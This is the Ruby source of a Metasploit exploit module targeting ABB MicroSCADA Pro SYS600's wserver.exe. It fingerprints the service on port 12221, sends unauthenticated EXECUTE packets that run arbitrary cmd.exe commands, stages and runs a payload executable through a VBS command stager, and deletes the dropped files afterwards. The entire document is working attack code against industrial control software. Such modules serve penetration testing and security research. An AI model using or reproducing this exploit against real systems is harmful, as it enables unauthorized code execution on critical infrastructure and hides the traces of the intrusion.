 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStagerVBS
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ABB MicroSCADA wserver.exe Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote stack buffer overflow vulnerability in ABB MicroSCADA. The
        issue is due to the handling of unauthenticated EXECUTE operations on the wserver.exe
        component, which allows arbitrary commands. The component is disabled by default, but
        required when a project uses the SCIL function WORKSTATION_CALL.
 
        This module has been tested successfully on ABB MicroSCADA Pro SYS600 9.3 over
        Windows XP SP3 and Windows 7 SP1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Brian Gorenc&#039;, # Original discovery
          &#039;juan vazquez&#039;  # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;100324&#039;],
          [ &#039;ZDI&#039;, &#039;13-270&#039; ],
          [ &#039;URL&#039;, &#039;http://www05.abb.com/global/scot/scot229.nsf/veritydisplay/41ccfa8ccd0431e6c1257c1200395574/$file/ABB_SoftwareVulnerabilityHandlingAdvisory_ABB-VU-PSAC-1MRS235805.pdf&#039;]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039; => 5
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;ABB MicroSCADA Pro SYS600 9.3&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Apr 05 2013&#039;
    ))
 
    register_options([Opt::RPORT(12221)], self.class)
  end
 
  def check
 
    # Send an EXECUTE packet without command, a valid response
    # should include an error code, which is good enough to
    # fingerprint.
    op = "EXECUTE\x00"
    pkt_length = [4 + op.length].pack("V") # 4 because of the packet length
    pkt = pkt_length
    pkt << op
 
    connect
    sock.put(pkt)
    res = sock.get_once
    disconnect
 
    if res and res.length == 6 and res[0, 2].unpack("v")[0] == 6 and res[2, 4].unpack("V")[0] == 0xe10001
      return Exploit::CheckCode::Vulnerable
    end
 
    return Exploit::CheckCode::Safe
 
  end
 
  def exploit
    # More then 750 will trigger overflow...
    # Cleaning is done by the exploit on execute_cmdstager_end
    execute_cmdstager({:linemax => 750, :nodelete => true})
  end
 
  def execute_cmdstager_end(opts)
    @var_tempdir = @stager_instance.instance_variable_get(:@tempdir)
    @var_decoded = @stager_instance.instance_variable_get(:@var_decoded)
    @var_encoded = @stager_instance.instance_variable_get(:@var_encoded)
    @var_decoder = @stager_instance.instance_variable_get(:@var_decoder)
    print_status("Trying to delete #{@var_tempdir}#{@var_encoded}.b64...")
    execute_command("del #{@var_tempdir}#{@var_encoded}.b64", {})
    print_status("Trying to delete #{@var_tempdir}#{@var_decoder}.vbs...")
    execute_command("del #{@var_tempdir}#{@var_decoder}.vbs", {})
    print_status("Trying to delete #{@var_tempdir}#{@var_decoded}.exe...")
    execute_command("del #{@var_tempdir}#{@var_decoded}.exe", {})
  end
 
  def execute_command(cmd, opts)
    op = "EXECUTE\x00"
    command = "cmd.exe /c #{cmd}"
    pkt_length = [4 + op.length + command.length].pack("V") # 4 because of the packet length
 
    pkt = pkt_length
    pkt << op
    pkt << command
 
    connect
    sock.put(pkt)
    res = sock.get_once
    disconnect
 
    unless res and res.length == 6 and res[0, 2].unpack("v")[0] == 6 and res[2, 4].unpack("V")[0] == 1
      fail_with(Failure::UnexpectedReply, "Unexpected reply while executing the cmdstager")
    end
  end
end

